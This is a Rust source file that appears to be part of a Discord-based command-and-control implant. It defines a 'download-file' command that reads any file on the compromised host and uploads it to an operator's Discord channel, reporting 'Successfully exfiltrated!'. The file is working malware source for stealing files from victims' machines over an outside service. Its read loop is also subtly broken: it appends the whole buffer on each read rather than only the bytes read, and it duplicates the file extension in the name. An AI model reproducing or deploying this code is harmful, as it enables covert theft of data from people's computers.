use std::borrow::Cow;
use std::path::{Path, PathBuf};
use serenity::builder::CreateApplicationCommand;
use serenity::client::Context;
use serenity::model::application::command::CommandOptionType;
use serenity::model::application::interaction::application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue};
use serenity::model::application::interaction::InteractionResponseType;
use serenity::model::channel::AttachmentType;
use tokio::fs::File;
use tokio::io::AsyncReadExt;
use crate::commands::SHELL_TYPE;
use crate::errors::DiscordC2Error;
use crate::os::process_handler::ProcessHandler;

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    command
        .name("download-file")
        .description("Downloads a file from the remote host.")
        .create_option(
            |option| {
                option.name("file-path")
                    .kind(CommandOptionType::String)
                    .description("Relative to the working directory of the session, or an absolute path")
                    .required(true)
            }
        )
}

pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType>, DiscordC2Error> {
    let option = options
        .get(0)
        .ok_or_else(|| DiscordC2Error::InvalidInput("Expected download options".to_string()))?
        .resolved.clone()
        .ok_or_else(|| DiscordC2Error::InvalidInput("File path option not found.".to_string()))?;

    if let CommandDataOptionValue::String(file_path) = option {
        // Validate the file path and make sure it actually exists
        let path = path_validator(file_path.as_str()).await?;
        let attachment = file_to_attachment(path).await?;

        Ok(Some(attachment))
    } else {
        Ok(None)
    }
}

async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
    let shell_type = SHELL_TYPE.lock().await;
    let process_handler = match shell_type.as_ref() {
        Some(shell_type) => {
            ProcessHandler::instance(shell_type).await
        }
        None => {
            Err(DiscordC2Error::InvalidInput("Shell type not found.".to_string()))
        }
    }?;

    // Should return a DiscordC2Error::RegexError if not successful
    let directory = process_handler.current_working_directory().await?;

    // Path is an absolute path and was found
    if Path::new(file_path).exists() {
        Ok(Path::new(file_path).to_path_buf())
    }
    // Path is relative to the WD of the shell and was found
    else if Path::new(&directory).join(file_path).exists() {
        Ok(Path::new(&directory).join(file_path))
    }
    // Path was not found
    else {
        Err(DiscordC2Error::NotFound(file_path.to_string()))
    }
}

// TODO: Prevent downloading files greater than 100MB
async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static>, DiscordC2Error> {
    let mut file = File::open(&file_path).await?;
    let mut buffer = [0; 8912];

    let _metadata = file.metadata().await?; // use this for size checks
    let mut final_bytes = Vec::new();

    let file_extension = file_path.extension().ok_or(DiscordC2Error::InvalidInput("File extension not found.".to_string()));
    let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput("File name not found.".to_string()));

    //TODO: reading 8kb into the file even if not necessary, this is why size checks are important
    loop {
        let bytes_read = file.read(&mut buffer).await?;
        if bytes_read == 0 {
            break;
        }
        final_bytes.extend_from_slice(&buffer);
    }
     Ok(AttachmentType::Bytes {
        data: Cow::from(final_bytes),
        filename: format!("{}.{}", file_name?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?, file_extension?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".parse().unwrap()))?),
    })
}

pub async fn download_handler(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
    let attachment = run(&command.data.options).await;
    match attachment {
        Ok(Some(attachment)) => {
            command
                .create_interaction_response(&ctx.http, |response| {
                    response
                        .kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|message| {
                            message.content("Successfully exfiltrated!");
                            message.add_file(attachment);
                            message
                        })
                }).await?;
        }
        Ok(None) => {
            return Ok(());
        }
        Err(reason) => {
            command
                .create_interaction_response(&ctx.http, |response| {
                    response
                        .kind(InteractionResponseType::ChannelMessageWithSource)
                        .interaction_response_data(|message| {
                            message.content(format!("CRITICAL ERROR WHEN DOWNLOADING FILE: {}", reason));
                            message
                        })
                }).await?;
        }
    }
    Ok(())
}